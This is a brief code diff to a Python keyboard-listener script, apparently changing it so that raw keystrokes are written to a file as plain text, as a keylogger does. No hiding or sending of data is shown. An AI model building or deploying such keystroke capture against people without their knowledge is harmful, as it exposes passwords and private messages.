@@ -18,11 +18,9 @@ def on_press(key):
             listener.stop()
     else:
         try:
-            keys.write('alphanumeric key {0} pressed\n'.format(
-                key.char))
+            keys.write(key.char)
         except AttributeError:
-            keys.write('special key {0} pressed\n'.format(
-                key))
+            keys.write(format(key))
 
 
 def on_release(key):
@@ -31,8 +29,7 @@ def on_release(key):
     except KeyError:
         pass
     try:
-        keys.write('{0} released\n'.format(
-            key))
+        keys.write(key)
     except:
         pass
 
